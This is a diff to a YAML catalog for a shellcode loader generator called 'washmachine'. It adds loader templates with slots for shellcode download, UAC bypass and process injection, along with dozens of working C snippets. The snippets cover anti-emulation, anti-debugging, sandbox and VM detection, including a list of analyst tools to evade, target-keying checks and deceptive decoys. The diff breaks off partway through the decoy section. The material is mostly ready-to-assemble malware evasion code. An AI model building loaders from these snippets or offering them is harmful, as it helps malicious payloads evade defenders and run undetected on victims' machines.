@@ -1,9 +1,23 @@
+# ============================================================================
+# WASHMACHINE DEFAULT CATALOG
+# ============================================================================
+# A comprehensive collection of evasion techniques including:
+# - Anti-Debugging
+# - Anti-Emulation  
+# - Anti-Sandbox/VM Detection
+# - Anti-Analysis
+# - Guardrails
+# - Process Injection
+# - Shellcode Execution Methods
+# ============================================================================
+
 templates:
   - id: "default"
     display: "Default Loader"
-    description: "Matches the legacy washmachine layout."
+    description: "Full-featured loader with all protection placeholders."
     content: |
       #include "Win32Helper.h"
+      #include <intrin.h>
 
       {{PROCESS_LOOKUP_HELPER}}
 
@@ -13,9 +27,15 @@ templates:
 
           {{SHELLCODE_URL}}
 
+          {{ANTI_EMULATION}}
+
           {{GUARDRAILS}}
 
+          {{ANTI_SANDBOX}}
+
           {{ANTI_DEBUGGING}}
+
+          {{DECOY}}
 
           {{UAC_BYPASS}}
 
@@ -33,28 +53,37 @@ templates:
         kind: system
       - name: "SHELLCODE_URL"
         kind: system
+      - name: "ANTI_EMULATION"
+        kind: snippet
+        snippetTemplate: "antiemulation"
       - name: "GUARDRAILS"
         kind: snippet
-        snippetTemplate: "GUARDRAIL"
+        snippetTemplate: "guardrail"
+      - name: "ANTI_SANDBOX"
+        kind: snippet
+        snippetTemplate: "antisandbox"
       - name: "ANTI_DEBUGGING"
         kind: snippet
-        snippetTemplate: "ANTIDEBUGGING"
+        snippetTemplate: "antidebugging"
+      - name: "DECOY"
+        kind: snippet
+        snippetTemplate: "decoy"
       - name: "UAC_BYPASS"
         kind: snippet
-        snippetTemplate: "UACB"
+        snippetTemplate: "uacb"
       - name: "PROCESS_INJECTION"
         kind: snippet
-        snippetTemplate: "PSINJECTION"
+        snippetTemplate: "psinjection"
       - name: "SHELLCODE_EXECUTION"
         kind: snippet
-        snippetTemplate: "SHELLCODEEXECUTION"
+        snippetTemplate: "shellcodeexecution"
+
   - id: "shellcode-minimal"
     display: "Shellcode Minimal"
-    description: "Minimal loader that only sets up the shellcode block and executes it."
+    description: "Minimal loader - only shellcode setup and execution."
     content: |
       #define WIN32_LEAN_AND_MEAN
       #include <windows.h>
-      //#include "Win32Helper.h"
 
       INT main(VOID)
       {
@@ -69,33 +98,870 @@ templates:
         kind: system
       - name: "SHELLCODE_EXECUTION"
         kind: snippet
-        snippetTemplate: "SHELLCODEEXECUTION"
+        snippetTemplate: "shellcodeexecution"
+
+  - id: "stealth-loader"
+    display: "Stealth Loader"
+    description: "Maximum evasion with anti-emulation, anti-sandbox, and anti-debugging."
+    content: |
+      #define WIN32_LEAN_AND_MEAN
+      #include <windows.h>
+      #include <intrin.h>
+
+      {{PROCESS_LOOKUP_HELPER}}
+
+      INT main(VOID)
+      {
+          {{ANTI_EMULATION}}
+
+          {{ANTI_SANDBOX}}
+
+          {{ANTI_DEBUGGING}}
+
+          {{GUARDRAILS}}
+
+          {{SHELLCODE_SOURCE}}
+
+          {{SHELLCODE_URL}}
+
+          {{SHELLCODE_EXECUTION}}
+
+          return 0;
+      }
+    placeholders:
+      - name: "PROCESS_LOOKUP_HELPER"
+        kind: system
+      - name: "ANTI_EMULATION"
+        kind: snippet
+        snippetTemplate: "antiemulation"
+      - name: "ANTI_SANDBOX"
+        kind: snippet
+        snippetTemplate: "antisandbox"
+      - name: "ANTI_DEBUGGING"
+        kind: snippet
+        snippetTemplate: "antidebugging"
+      - name: "GUARDRAILS"
+        kind: snippet
+        snippetTemplate: "guardrail"
+      - name: "SHELLCODE_SOURCE"
+        kind: system
+      - name: "SHELLCODE_URL"
+        kind: system
+      - name: "SHELLCODE_EXECUTION"
+        kind: snippet
+        snippetTemplate: "shellcodeexecution"
+
+# ============================================================================
+# SECTIONS - Organized by Category
+# ============================================================================
 
 sections:
-  - header: "Anti Debugging"
-    template: "antidebugging"
-    display: "Anti Debugging"
+  # --------------------------------------------------------------------------
+  # ANTI-EMULATION TECHNIQUES
+  # Defeat AV/EDR emulators by exhausting resources or timing
+  # --------------------------------------------------------------------------
+  - header: "Anti Emulation"
+    template: "antiemulation"
+    display: "Anti-Emulation"
     allowMultiple: true
     items:
-      - id: "AdfCloseHandleOnInvalidAddress"
-        display: "AdfCloseHandleOnInvalidAddress"
+      - id: "None"
+        display: "None (Skip)"
+        default: false
+        snippet: |
+          // No anti-emulation
+
+      - id: "SirAllocALot"
+        display: "SirAllocALot (Memory Exhaustion)"
         default: true
         snippet: |
-          __try
+          // Anti-emulation: Exhaust emulator with memory allocations
+          // Allocates many RW regions, sets to RX, then frees - repeated multiple times
+          // This overwhelms AV emulators (memory limits, API call limits, or time limits)
           {
-          #pragma warning( push )
-          #pragma warning( disable : 4312)
+              const int SIR_ALLOC_COUNT = 100;
+              const int SIR_ITERATION_COUNT = 5;
+              const int ALLOC_SIZE = 4096;
+              void* allocs[100];
+              DWORD result;
+
+              for(int i = 0; i < SIR_ITERATION_COUNT; i++) {
+                  for(int n = 0; n < SIR_ALLOC_COUNT; n++) {
+                      allocs[n] = VirtualAlloc(NULL, ALLOC_SIZE, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+                      if (allocs[n]) {
+                          char *ptr = (char*)allocs[n];
+                          for(int j = 0; j < ALLOC_SIZE; j++) {
+                              ptr[j] = 0x23;
+                          }
+                      }
+                  }
+
+                  for(int n = 0; n < SIR_ALLOC_COUNT; n++) {
+                      if (allocs[n]) {
+                          VirtualProtect(allocs[n], ALLOC_SIZE, PAGE_EXECUTE_READ, &result);
+                      }
+                  }
+
+                  for(int n = 0; n < SIR_ALLOC_COUNT; n++) {
+                      if (allocs[n]) {
+                          VirtualFree(allocs[n], 0, MEM_RELEASE);
+                      }
+                  }
+              }
+          }
+
+      - id: "TimeRawKernel"
+        display: "Time Delay (Kernel Time Register)"
+        default: false
+        snippet: |
+          // Anti-emulation: Busy sleep using kernel time register
+          // Uses memory address 0x7ffe0004 which is not affected by Sleep() hooks
+          {
+              auto get_time_raw = []() -> DWORD {
+                  ULONG* PUserSharedData_TickCountMultiplier = (ULONG*)0x7ffe0004;
+                  LONG* PUserSharedData_High1Time = (LONG*)0x7ffe0324;
+                  ULONG* PUserSharedData_LowPart = (ULONG*)0x7ffe0320;
+                  DWORD kernelTime = (*PUserSharedData_TickCountMultiplier) * (*PUserSharedData_High1Time << 8) +
+                      ((*PUserSharedData_LowPart) * (unsigned __int64)(*PUserSharedData_TickCountMultiplier) >> 24);
+                  return kernelTime;
+              };
+
+              auto sleep_raw_ms = [&get_time_raw](DWORD sleeptime) {
+                  DWORD start = get_time_raw();
+                  while (get_time_raw() - start < sleeptime) {}
+              };
+
+              sleep_raw_ms(3000); // 3 second delay
+          }
+
+      - id: "DelayExecNtDelayExecution"
+        display: "Delay via NtDelayExecution"
+        default: false
+        snippet: |
+          // Anti-emulation: Direct syscall delay that cannot be easily hooked
+          {
+              typedef NTSTATUS (NTAPI *pNtDelayExecution)(BOOLEAN Alertable, PLARGE_INTEGER DelayInterval);
+              HMODULE ntdll = GetModuleHandleA("ntdll.dll");
+              if (ntdll) {
+                  pNtDelayExecution NtDelayExec = (pNtDelayExecution)GetProcAddress(ntdll, "NtDelayExecution");
+                  if (NtDelayExec) {
+                      LARGE_INTEGER delay;
+                      delay.QuadPart = -50000000LL; // 5 seconds in 100ns intervals (negative = relative)
+                      NtDelayExec(FALSE, &delay);
+                  }
+              }
+          }
+
+      - id: "HeavyComputation"
+        display: "Heavy Computation (CPU Exhaustion)"
+        default: false
+        snippet: |
+          // Anti-emulation: Heavy computation to exhaust emulator cycles
+          {
+              volatile unsigned int result = 0;
+              for (unsigned int i = 0; i < 50000000; i++) {
+                  result ^= i;
+                  result = (result << 1) | (result >> 31);
+                  result += i * 7;
+              }
+              // Use result to prevent optimization
+              if (result == 0xDEADBEEF) return 1;
+          }
+
+      - id: "FlsCallbacks"
+        display: "FLS Callback Abuse"
+        default: false
+        snippet: |
+          // Anti-emulation: Abuse FLS (Fiber Local Storage) callbacks
+          // Many emulators don't properly implement FLS callbacks
+          {
+              volatile BOOL flsCalled = FALSE;
+              auto flsCallback = [](PVOID lpFlsData) -> VOID {
+                  *(volatile BOOL*)lpFlsData = TRUE;
+              };
+              
+              DWORD flsIndex = FlsAlloc((PFLS_CALLBACK_FUNCTION)flsCallback);
+              if (flsIndex != FLS_OUT_OF_INDEXES) {
+                  FlsSetValue(flsIndex, (PVOID)&flsCalled);
+                  FlsFree(flsIndex);
+                  
+                  if (!flsCalled) {
+                      // FLS callback wasn't called - likely in emulator
+                      return 0;
+                  }
+              }
+          }
+
+  # --------------------------------------------------------------------------
+  # ANTI-DEBUGGING TECHNIQUES
+  # Detect and evade debuggers
+  # --------------------------------------------------------------------------
+  - header: "Anti Debugging"
+    template: "antidebugging"
+    display: "Anti-Debugging"
+    allowMultiple: true
+    items:
+      - id: "None"
+        display: "None (Skip)"
+        default: false
+        snippet: |
+          // No anti-debugging
+
+      - id: "IsDebuggerPresent"
+        display: "IsDebuggerPresent API"
+        default: true
+        snippet: |
+          // Anti-debug: Check IsDebuggerPresent
+          if (IsDebuggerPresent()) {
+              return 0;
+          }
+
+      - id: "CheckRemoteDebuggerPresent"
+        display: "CheckRemoteDebuggerPresent API"
+        default: false
+        snippet: |
+          // Anti-debug: Check for remote debugger
+          {
+              BOOL debuggerPresent = FALSE;
+              if (CheckRemoteDebuggerPresent(GetCurrentProcess(), &debuggerPresent)) {
+                  if (debuggerPresent) {
+                      return 0;
+                  }
+              }
+          }
+
+      - id: "PebBeingDebugged"
+        display: "PEB BeingDebugged Flag"
+        default: false
+        snippet: |
+          // Anti-debug: Direct PEB check
+          {
+              #ifdef _WIN64
+              PPEB pPeb = (PPEB)__readgsqword(0x60);
+              #else
+              PPEB pPeb = (PPEB)__readfsdword(0x30);
+              #endif
+              if (pPeb->BeingDebugged) {
+                  return 0;
+              }
+          }
+
+      - id: "NtGlobalFlag"
+        display: "NtGlobalFlag Check"
+        default: false
+        snippet: |
+          // Anti-debug: Check NtGlobalFlag in PEB
+          // Debuggers set heap flags: FLG_HEAP_ENABLE_TAIL_CHECK | FLG_HEAP_ENABLE_FREE_CHECK | FLG_HEAP_VALIDATE_PARAMETERS
+          {
+              #ifdef _WIN64
+              PDWORD pNtGlobalFlag = (PDWORD)((PBYTE)__readgsqword(0x60) + 0xBC);
+              #else
+              PDWORD pNtGlobalFlag = (PDWORD)((PBYTE)__readfsdword(0x30) + 0x68);
+              #endif
+              if (*pNtGlobalFlag & 0x70) { // FLG_HEAP_* flags
+                  return 0;
+              }
+          }
+
+      - id: "HeapFlags"
+        display: "Heap Flags Check"
+        default: false
+        snippet: |
+          // Anti-debug: Check heap flags set by debugger
+          {
+              #ifdef _WIN64
+              PPEB pPeb = (PPEB)__readgsqword(0x60);
+              PVOID heap = (PVOID)*(PDWORD_PTR)((PBYTE)pPeb + 0x30);
+              DWORD heapFlags = *(PDWORD)((PBYTE)heap + 0x70);
+              DWORD forceFlags = *(PDWORD)((PBYTE)heap + 0x74);
+              #else
+              PPEB pPeb = (PPEB)__readfsdword(0x30);
+              PVOID heap = (PVOID)*(PDWORD)((PBYTE)pPeb + 0x18);
+              DWORD heapFlags = *(PDWORD)((PBYTE)heap + 0x40);
+              DWORD forceFlags = *(PDWORD)((PBYTE)heap + 0x44);
+              #endif
+              if (heapFlags & ~HEAP_GROWABLE || forceFlags != 0) {
+                  return 0;
+              }
+          }
+
+      - id: "CloseHandleException"
+        display: "CloseHandle Invalid Handle"
+        default: false
+        snippet: |
+          // Anti-debug: CloseHandle with invalid handle causes exception under debugger
+          __try {
               CloseHandle((HANDLE)0xDEADBEEF);
-          #pragma warning( pop )
-              return FALSE;
           }
-          __except (EXCEPTION_INVALID_HANDLE == GetExceptionCode() ? EXCEPTION_EXECUTE_HANDLER : EXCEPTION_CONTINUE_SEARCH)
+          __except (GetExceptionCode() == EXCEPTION_INVALID_HANDLE ? EXCEPTION_EXECUTE_HANDLER : EXCEPTION_CONTINUE_SEARCH) {
+              // Exception caught = debugger present
+              return 0;
+          }
+
+      - id: "OutputDebugString"
+        display: "OutputDebugString Error Check"
+        default: false
+        snippet: |
+          // Anti-debug: OutputDebugString sets error differently when debugger present
           {
-              return TRUE;
+              SetLastError(0);
+              OutputDebugStringA("Test");
+              if (GetLastError() == 0) {
+                  // Debugger consumed the string
+                  return 0;
+              }
           }
 
-          return FALSE;
+      - id: "HardwareBreakpoints"
+        display: "Hardware Breakpoints Detection"
+        default: false
+        snippet: |
+          // Anti-debug: Check for hardware breakpoints via debug registers
+          {
+              CONTEXT ctx = {0};
+              ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
+              if (GetThreadContext(GetCurrentThread(), &ctx)) {
+                  if (ctx.Dr0 || ctx.Dr1 || ctx.Dr2 || ctx.Dr3) {
+                      return 0;
+                  }
+              }
+          }
 
+      - id: "TimingRdtsc"
+        display: "RDTSC Timing Check"
+        default: false
+        snippet: |
+          // Anti-debug: Timing check using RDTSC
+          // Debugger stepping causes significant delay
+          {
+              unsigned __int64 start = __rdtsc();
+              
+              // Small operation
+              volatile int x = 0;
+              for (int i = 0; i < 100; i++) x++;
+              
+              unsigned __int64 end = __rdtsc();
+              
+              // Threshold for normal execution (adjust based on CPU)
+              if ((end - start) > 0x100000) {
+                  return 0;
+              }
+          }
+
+      - id: "NtQueryInformationProcess"
+        display: "NtQueryInformationProcess Debug Port"
+        default: false
+        snippet: |
+          // Anti-debug: Query debug port via NtQueryInformationProcess
+          {
+              typedef NTSTATUS (NTAPI *pNtQueryInformationProcess)(HANDLE, ULONG, PVOID, ULONG, PULONG);
+              HMODULE ntdll = GetModuleHandleA("ntdll.dll");
+              if (ntdll) {
+                  pNtQueryInformationProcess NtQIP = (pNtQueryInformationProcess)GetProcAddress(ntdll, "NtQueryInformationProcess");
+                  if (NtQIP) {
+                      HANDLE debugPort = NULL;
+                      NTSTATUS status = NtQIP(GetCurrentProcess(), 7, &debugPort, sizeof(debugPort), NULL); // ProcessDebugPort = 7
+                      if (status == 0 && debugPort != NULL) {
+                          return 0;
+                      }
+                  }
+              }
+          }
+
+      - id: "ParentProcessCheck"
+        display: "Parent Process Check"
+        default: false
+        snippet: |
+          // Anti-debug: Check if parent process is a known debugger
+          {
+              typedef NTSTATUS (NTAPI *pNtQueryInformationProcess)(HANDLE, ULONG, PVOID, ULONG, PULONG);
+              HMODULE ntdll = GetModuleHandleA("ntdll.dll");
+              if (ntdll) {
+                  pNtQueryInformationProcess NtQIP = (pNtQueryInformationProcess)GetProcAddress(ntdll, "NtQueryInformationProcess");
+                  if (NtQIP) {
+                      struct { PVOID Reserved1; PVOID PebBaseAddress; PVOID Reserved2[2]; ULONG_PTR UniqueProcessId; PVOID Reserved3; } pbi;
+                      if (NtQIP(GetCurrentProcess(), 0, &pbi, sizeof(pbi), NULL) == 0) {
+                          HANDLE hParent = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, (DWORD)(ULONG_PTR)pbi.Reserved3);
+                          if (hParent) {
+                              WCHAR parentName[MAX_PATH] = {0};
+                              DWORD size = MAX_PATH;
+                              if (QueryFullProcessImageNameW(hParent, 0, parentName, &size)) {
+                                  _wcslwr_s(parentName, MAX_PATH);
+                                  if (wcsstr(parentName, L"ollydbg") || wcsstr(parentName, L"x64dbg") ||
+                                      wcsstr(parentName, L"windbg") || wcsstr(parentName, L"ida") ||
+                                      wcsstr(parentName, L"immunity") || wcsstr(parentName, L"radare")) {
+                                      CloseHandle(hParent);
+                                      return 0;
+                                  }
+                              }
+                              CloseHandle(hParent);
+                          }
+                      }
+                  }
+              }
+          }
+
+      - id: "TrapFlag"
+        display: "Trap Flag Detection"
+        default: false
+        snippet: |
+          // Anti-debug: Single-step trap flag detection
+          __try {
+              __asm {
+                  pushfd
+                  or dword ptr [esp], 0x100 ; Set trap flag
+                  popfd
+                  nop
+              }
+          }
+          __except(EXCEPTION_EXECUTE_HANDLER) {
+              // Normal execution - exception handler called
+              goto trap_ok;
+          }
+          // If we get here, debugger consumed the exception
+          return 0;
+          trap_ok:;
+
+  # --------------------------------------------------------------------------
+  # ANTI-SANDBOX / VM DETECTION
+  # Detect sandbox and virtual machine environments
+  # --------------------------------------------------------------------------
+  - header: "Anti Sandbox"
+    template: "antisandbox"
+    display: "Anti-Sandbox/VM"
+    allowMultiple: true
+    items:
+      - id: "None"
+        display: "None (Skip)"
+        default: true
+        snippet: |
+          // No anti-sandbox
+
+      - id: "CpuidHypervisor"
+        display: "CPUID Hypervisor Bit"
+        default: false
+        snippet: |
+          // Anti-sandbox: Check CPUID hypervisor bit
+          {
+              int cpuInfo[4] = {0};
+              __cpuid(cpuInfo, 1);
+              if (cpuInfo[2] & (1 << 31)) {
+                  // Hypervisor present
+                  return 0;
+              }
+          }
+
+      - id: "CpuidVMVendor"
+        display: "CPUID VM Vendor String"
+        default: false
+        snippet: |
+          // Anti-sandbox: Check for VM vendor strings via CPUID
+          {
+              int cpuInfo[4] = {0};
+              __cpuid(cpuInfo, 0x40000000);
+              char vendor[13] = {0};
+              memcpy(vendor, &cpuInfo[1], 4);
+              memcpy(vendor + 4, &cpuInfo[2], 4);
+              memcpy(vendor + 8, &cpuInfo[3], 4);
+              
+              // Known VM vendors
+              if (strstr(vendor, "VMwareVMware") || strstr(vendor, "Microsoft Hv") ||
+                  strstr(vendor, "VBoxVBoxVBox") || strstr(vendor, "KVMKVMKVM") ||
+                  strstr(vendor, "XenVMMXenVMM") || strstr(vendor, "prl hyperv")) {
+                  return 0;
+              }
+          }
+
+      - id: "MacAddressCheck"
+        display: "MAC Address VM Detection"
+        default: false
+        snippet: |
+          // Anti-sandbox: Check for VM MAC address prefixes
+          {
+              IP_ADAPTER_INFO adapterInfo[16];
+              DWORD bufLen = sizeof(adapterInfo);
+              if (GetAdaptersInfo(adapterInfo, &bufLen) == ERROR_SUCCESS) {
+                  PIP_ADAPTER_INFO pAdapter = adapterInfo;
+                  while (pAdapter) {
+                      // VMware: 00:0C:29, 00:50:56, 00:05:69
+                      // VirtualBox: 08:00:27
+                      // Hyper-V: 00:15:5D
+                      // Parallels: 00:1C:42
+                      if ((pAdapter->Address[0] == 0x00 && pAdapter->Address[1] == 0x0C && pAdapter->Address[2] == 0x29) ||
+                          (pAdapter->Address[0] == 0x00 && pAdapter->Address[1] == 0x50 && pAdapter->Address[2] == 0x56) ||
+                          (pAdapter->Address[0] == 0x08 && pAdapter->Address[1] == 0x00 && pAdapter->Address[2] == 0x27) ||
+                          (pAdapter->Address[0] == 0x00 && pAdapter->Address[1] == 0x15 && pAdapter->Address[2] == 0x5D) ||
+                          (pAdapter->Address[0] == 0x00 && pAdapter->Address[1] == 0x1C && pAdapter->Address[2] == 0x42)) {
+                          return 0;
+                      }
+                      pAdapter = pAdapter->Next;
+                  }
+              }
+          }
+
+      - id: "RegistryVMCheck"
+        display: "Registry VM Artifacts"
+        default: false
+        snippet: |
+          // Anti-sandbox: Check registry for VM artifacts
+          {
+              HKEY hKey;
+              const wchar_t* vmKeys[] = {
+                  L"SOFTWARE\\VMware, Inc.\\VMware Tools",
+                  L"SOFTWARE\\Oracle\\VirtualBox Guest Additions",
+                  L"SYSTEM\\CurrentControlSet\\Services\\VBoxSF",
+                  L"SYSTEM\\CurrentControlSet\\Services\\vmci",
+                  L"SOFTWARE\\Microsoft\\Virtual Machine\\Guest\\Parameters"
+              };
+              for (int i = 0; i < 5; i++) {
+                  if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, vmKeys[i], 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
+                      RegCloseKey(hKey);
+                      return 0;
+                  }
+              }
+          }
+
+      - id: "ProcessListCheck"
+        display: "Sandbox Process Detection"
+        default: false
+        snippet: |
+          // Anti-sandbox: Check for sandbox/analysis processes
+          {
+              const wchar_t* sandboxProcs[] = {
+                  L"vmtoolsd.exe", L"vmwaretray.exe", L"vmwareuser.exe",
+                  L"vboxservice.exe", L"vboxtray.exe",
+                  L"sandboxiedcomlaunch.exe", L"sandboxierpcss.exe",
+                  L"procmon.exe", L"procmon64.exe", L"procexp.exe", L"procexp64.exe",
+                  L"wireshark.exe", L"fiddler.exe", L"tcpview.exe",
+                  L"autoruns.exe", L"filemon.exe", L"regmon.exe",
+                  L"idaq.exe", L"idaq64.exe", L"x64dbg.exe", L"x32dbg.exe"
+              };
+              
+              HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+              if (hSnap != INVALID_HANDLE_VALUE) {
+                  PROCESSENTRY32W pe32 = {sizeof(pe32)};
+                  if (Process32FirstW(hSnap, &pe32)) {
+                      do {
+                          for (int i = 0; i < 19; i++) {
+                              if (_wcsicmp(pe32.szExeFile, sandboxProcs[i]) == 0) {
+                                  CloseHandle(hSnap);
+                                  return 0;
+                              }
+                          }
+                      } while (Process32NextW(hSnap, &pe32));
+                  }
+                  CloseHandle(hSnap);
+              }
+          }
+
+      - id: "LowResourceCheck"
+        display: "Low Resource Detection"
+        default: false
+        snippet: |
+          // Anti-sandbox: Check for unrealistically low system resources
+          {
+              // Check RAM (sandboxes often have <2GB)
+              MEMORYSTATUSEX memStatus = {sizeof(memStatus)};
+              if (GlobalMemoryStatusEx(&memStatus)) {
+                  if (memStatus.ullTotalPhys < 2ULL * 1024 * 1024 * 1024) { // < 2GB
+                      return 0;
+                  }
+              }
+              
+              // Check disk size (sandboxes often have <60GB)
+              ULARGE_INTEGER totalBytes;
+              if (GetDiskFreeSpaceExW(L"C:\\", NULL, &totalBytes, NULL)) {
+                  if (totalBytes.QuadPart < 60ULL * 1024 * 1024 * 1024) { // < 60GB
+                      return 0;
+                  }
+              }
+              
+              // Check number of processors
+              SYSTEM_INFO sysInfo;
+              GetSystemInfo(&sysInfo);
+              if (sysInfo.dwNumberOfProcessors < 2) {
+                  return 0;
+              }
+          }
+
+      - id: "UsernameCheck"
+        display: "Sandbox Username Detection"
+        default: false
+        snippet: |
+          // Anti-sandbox: Check for common sandbox usernames
+          {
+              WCHAR username[256];
+              DWORD size = 256;
+              if (GetUserNameW(username, &size)) {
+                  _wcslwr_s(username, 256);
+                  const wchar_t* sandboxUsers[] = {
+                      L"sandbox", L"virus", L"malware", L"maltest", L"test",
+                      L"sample", L"vmware", L"vbox", L"analysis", L"cuckoo",
+                      L"john doe", L"user", L"currentuser", L"admin"
+                  };
+                  for (int i = 0; i < 14; i++) {
+                      if (wcsstr(username, sandboxUsers[i])) {
+                          return 0;
+                      }
+                  }
+              }
+          }
+
+      - id: "RecentFilesCheck"
+        display: "Recent Files Check"
+        default: false
+        snippet: |
+          // Anti-sandbox: Check for user activity (recent files)
+          // Sandboxes typically have no user activity
+          {
+              WCHAR recentPath[MAX_PATH];
+              if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_RECENT, NULL, 0, recentPath))) {
+                  WIN32_FIND_DATAW fd;
+                  WCHAR searchPath[MAX_PATH];
+                  wsprintfW(searchPath, L"%s\\*", recentPath);
+                  HANDLE hFind = FindFirstFileW(searchPath, &fd);
+                  if (hFind != INVALID_HANDLE_VALUE) {
+                      int fileCount = 0;
+                      do {
+                          if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
+                              fileCount++;
+                          }
+                      } while (FindNextFileW(hFind, &fd) && fileCount < 10);
+                      FindClose(hFind);
+                      
+                      if (fileCount < 5) {
+                          // Too few recent files - likely sandbox
+                          return 0;
+                      }
+                  }
+              }
+          }
+
+      - id: "ScreenResolutionCheck"
+        display: "Screen Resolution Check"
+        default: false
+        snippet: |
+          // Anti-sandbox: Check screen resolution
+          // Sandboxes often use low/unusual resolutions
+          {
+              int width = GetSystemMetrics(SM_CXSCREEN);
+              int height = GetSystemMetrics(SM_CYSCREEN);
+              
+              // Most real systems have at least 1024x768
+              if (width < 1024 || height < 768) {
+                  return 0;
+              }
+              
+              // Check for suspicious exact sandbox resolutions
+              if (width == 800 && height == 600) {
+                  return 0;
+              }
+          }
+
+      - id: "FileTimeCheck"
+        display: "Installation Age Check"
+        default: false
+        snippet: |
+          // Anti-sandbox: Check if Windows was recently installed
+          // Sandboxes have recent install times
+          {
+              WCHAR windowsDir[MAX_PATH];
+              if (GetWindowsDirectoryW(windowsDir, MAX_PATH)) {
+                  WIN32_FILE_ATTRIBUTE_DATA fileInfo;
+                  if (GetFileAttributesExW(windowsDir, GetFileExInfoStandard, &fileInfo)) {
+                      FILETIME now;
+                      GetSystemTimeAsFileTime(&now);
+                      
+                      ULARGE_INTEGER installTime, currentTime;
+                      installTime.LowPart = fileInfo.ftCreationTime.dwLowDateTime;
+                      installTime.HighPart = fileInfo.ftCreationTime.dwHighDateTime;
+                      currentTime.LowPart = now.dwLowDateTime;
+                      currentTime.HighPart = now.dwHighDateTime;
+                      
+                      // Check if installed less than 1 day ago (in 100ns intervals)
+                      ULONGLONG oneDay = 10000000ULL * 60 * 60 * 24;
+                      if (currentTime.QuadPart - installTime.QuadPart < oneDay) {
+                          return 0;
+                      }
+                  }
+              }
+          }
+
+  # --------------------------------------------------------------------------
+  # GUARDRAILS
+  # Keying and environmental requirements
+  # --------------------------------------------------------------------------
+  - header: "Guardrails"
+    template: "guardrail"
+    display: "Guardrails"
+    allowMultiple: true
+    inputs:
+      - id: "guardrailParamTextBox"
+        type: "textbox"
+        label: "Guardrail parameter"
+        placement: "before"
+        width: 240
+        required: false
+        defaultValue: "COMPUTERNAME#contains#TARGET"
+        infoAction: "GuardRailInfo"
+        infoButtonLabel: "Info"
+    items:
+      - id: "None"
+        display: "None (Skip)"
+        default: true
+        snippet: |
+          // No guardrails
+
+      - id: "EnvVarExists"
+        display: "Environment Variable Exists"
+        default: false
+        snippet: |
+          // Guardrail: Require environment variable to exist
+          if (GetEnvironmentVariableW(L"__GUARDRAIL_PARAM__", nullptr, 0) == 0) {
+              return 0;
+          }
+
+      - id: "EnvVarContains"
+        display: "Environment Variable Contains Value"
+        default: false
+        snippet: |
+          // Guardrail: Environment variable must contain specific value
+          {
+              auto my_tolower = [](char c) -> char {
+                  return (c >= 'A' && c <= 'Z') ? c + 32 : c;
+              };
+              
+              auto contains_ci = [&my_tolower](const char* haystack, const char* needle) -> bool {
+                  if (!haystack || !needle) return false;
+                  for (; *haystack; haystack++) {
+                      const char* h = haystack;
+                      const char* n = needle;
+                      while (*h && *n && my_tolower(*h) == my_tolower(*n)) { h++; n++; }
+                      if (*n == '\0') return true;
+                  }
+                  return false;
+              };
+              
+              char buffer[1024];
+              DWORD result = GetEnvironmentVariableA("COMPUTERNAME", buffer, 1024);
+              if (result == 0 || !contains_ci(buffer, "__GUARDRAIL_PARAM__")) {
+                  return 0;
+              }
+          }
+
+      - id: "DomainCheck"
+        display: "Domain Membership Check"
+        default: false
+        snippet: |
+          // Guardrail: Require domain membership
+          {
+              WCHAR domainName[256];
+              DWORD size = 256;
+              NETSETUP_JOIN_STATUS status;
+              if (NetGetJoinInformation(NULL, (LPWSTR*)&domainName, &status) == NERR_Success) {
+                  if (status != NetSetupDomainName) {
+                      NetApiBufferFree(domainName);
+                      return 0; // Not joined to a domain
+                  }
+                  // Optionally check specific domain
+                  // if (_wcsicmp(domainName, L"TARGETDOMAIN") != 0) return 0;
+                  NetApiBufferFree(domainName);
+              }
+          }
+
+      - id: "DateRangeCheck"
+        display: "Execution Date Range"
+        default: false
+        snippet: |
+          // Guardrail: Only execute within date range
+          {
+              SYSTEMTIME st;
+              GetLocalTime(&st);
+              
+              // Configure your date range (YYYY, MM, DD)
+              WORD startYear = 2024, startMonth = 1, startDay = 1;
+              WORD endYear = 2025, endMonth = 12, endDay = 31;
+              
+              DWORD current = (st.wYear * 10000) + (st.wMonth * 100) + st.wDay;
+              DWORD start = (startYear * 10000) + (startMonth * 100) + startDay;
+              DWORD end = (endYear * 10000) + (endMonth * 100) + endDay;
+              
+              if (current < start || current > end) {
+                  return 0;
+              }
+          }
+
+      - id: "FileExistsCheck"
+        display: "Required File Exists"
+        default: false
+        snippet: |
+          // Guardrail: Required file must exist
+          {
+              DWORD attr = GetFileAttributesW(L"C:\\Users\\target\\Desktop\\marker.txt");
+              if (attr == INVALID_FILE_ATTRIBUTES) {
+                  return 0;
+              }
+          }
+
+  # --------------------------------------------------------------------------
+  # DECOY OPERATIONS
+  # Benign actions to confuse analysis
+  # --------------------------------------------------------------------------
+  - header: "Decoy"
+    template: "decoy"
+    display: "Decoy Operations"
+    allowMultiple: true
+    items:
+      - id: "None"
+        display: "None (Skip)"
+        default: true
+        snippet: |
+          // No decoy operations
+
+      - id: "OpenNotepad"
+        display: "Open Notepad"
+        default: false
+        snippet: |
+          // Decoy: Open notepad to appear benign
+          WinExec("C:\\Windows\\System32\\notepad.exe", SW_HIDE);
+
+      - id: "OpenCalculator"
+        display: "Open Calculator"
+        default: false
+        snippet: |
+          // Decoy: Open calculator
+          WinExec("calc.exe", SW_HIDE);
+
+      - id: "ShowMessageBox"
+        display: "Show Fake Error"
+        default: false
+        snippet: |
+          // Decoy: Show fake error message
+          MessageBoxW(NULL, L"Application failed to initialize correctly.", L"Error", MB_ICONERROR | MB_OK);
+
+      - id: "CreateDummyFiles"
+        display: "Create Dummy Files"
+        default: false
+        snippet: |
+          // Decoy: Create benign-looking temporary files
+          {
+              WCHAR tempPath[MAX_PATH];
+              if (GetTempPathW(MAX_PATH, tempPath)) {
+                  WCHAR filePath[MAX_PATH];
+                  wsprintfW(filePath, L"%s\\update_check.tmp", tempPath);
+                  HANDLE hFile = CreateFileW(filePath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+                  if (hFile != INVALID_HANDLE_VALUE) {
+                      const char* data = "version=1.0.0\nstatus=ok\n";
+                      DWORD written;
